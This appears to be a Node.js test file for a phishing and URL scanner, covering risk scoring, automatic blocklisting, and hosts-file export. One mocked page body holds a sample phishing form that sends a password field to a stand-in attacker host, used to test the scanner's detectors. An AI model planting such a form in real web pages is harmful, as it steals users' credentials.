const test = require("node:test");
const assert = require("node:assert/strict");
const os = require("node:os");
const path = require("node:path");
const fs = require("node:fs");
const { scanUrl } = require("../src/scanner");
const { createBlocklist } = require("../src/blocklist");

function temporaryBlocklist() {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "clearsignal-test-"));
  const blocklist = createBlocklist(path.join(directory, "blocklist.json"));
  return { blocklist, cleanup: () => fs.rmSync(directory, { recursive: true, force: true }) };
}

test("automatically blocks a high-score domain and returns diagnostics", async (t) => {
  const temporary = temporaryBlocklist();
  t.after(temporary.cleanup);
  const result = await scanUrl("https://bank-login-verification.xyz", {
    feed: { urls: new Set(), available: true },
    blocklist: temporary.blocklist,
  });

  assert.equal(result.overall_score >= 70, true);
  assert.equal(result.verdict, "BLOCKED - MALICIOUS");
  assert.equal(result.action_taken, "Added to Active Blocklist");
  assert.ok(result.diagnostics.every((item) => item.category && item.severity && item.penalty));
  assert.equal(temporary.blocklist.find("sub.bank-login-verification.xyz").domain, "bank-login-verification.xyz");
});

test("does not silently block a low-risk address", async (t) => {
  const temporary = temporaryBlocklist();
  t.after(temporary.cleanup);
  const result = await scanUrl("https://example.com", {
    feed: { urls: new Set(), available: true },
    blocklist: temporary.blocklist,
  });

  assert.equal(result.verdict, "SAFE");
  assert.equal(result.action_taken, "Allowed");
  assert.equal(temporary.blocklist.list().length, 0);
});

test("returns a hosts-file export without changing system configuration", (t) => {
  const temporary = temporaryBlocklist();
  t.after(temporary.cleanup);
  temporary.blocklist.add("bad.example", 90, "test");

  assert.match(temporary.blocklist.hostsFile(), /0\.0\.0\.0 bad\.example/);
  assert.equal(temporary.blocklist.list().length, 1);
});

test("combines live TLS, redirect, HTML, and DNS diagnostics without real network access", async (t) => {
  const temporary = temporaryBlocklist();
  t.after(temporary.cleanup);
  const result = await scanUrl("https://example.com", {
    feed: { urls: new Set(), available: true },
    blocklist: temporary.blocklist,
    checkNetwork: true,
    checkPublicUrl: async () => ({
      performed: true,
      redirects: 0,
      finalUrl: "https://example.com/",
      flags: [],
    }),
    fetchPublicHtml: async () => ({
      contentType: "text/html",
      finalUrl: "https://example.com/",
      redirects: 0,
      body: `<form action="http://attacker.example/post"><input type="password"></form>`,
    }),
    inspectDns: async () => [],
  });

  assert.ok(result.diagnostics.some((item) => item.code === "password_form_http"));
  assert.ok(result.diagnostics.some((item) => item.code === "password_form_external"));
  assert.equal(result.pageInspection.performed, true);
});
